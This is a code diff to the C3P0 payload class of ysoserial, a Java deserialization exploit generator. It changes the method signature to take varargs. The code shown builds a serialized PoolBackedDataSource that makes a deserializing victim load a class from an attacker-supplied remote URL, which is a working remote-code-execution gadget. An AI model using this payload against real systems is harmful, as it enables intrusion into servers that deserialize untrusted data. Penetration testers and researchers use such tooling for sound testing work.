@@ -42,14 +42,14 @@ import ysoserial.payloads.util.Reflections;
 @Dependencies( { "com.mchange:c3p0:0.9.5.2" ,"com.mchange:mchange-commons-java:0.2.11"} )
 @Authors({ Authors.MBECHLER })
 public class C3P0 implements ObjectPayload<Object> {
-    public Object getObject ( String command ) throws Exception {
-        int sep = command.lastIndexOf(':');
+    public Object getObject ( String ... command ) throws Exception {
+        int sep = command[0].lastIndexOf(':');
         if ( sep < 0 ) {
             throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
         }
 
-        String url = command.substring(0, sep);
-        String className = command.substring(sep + 1);
+        String url = command[0].substring(0, sep);
+        String className = command[0].substring(sep + 1);
 
         PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
         Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(className, url));
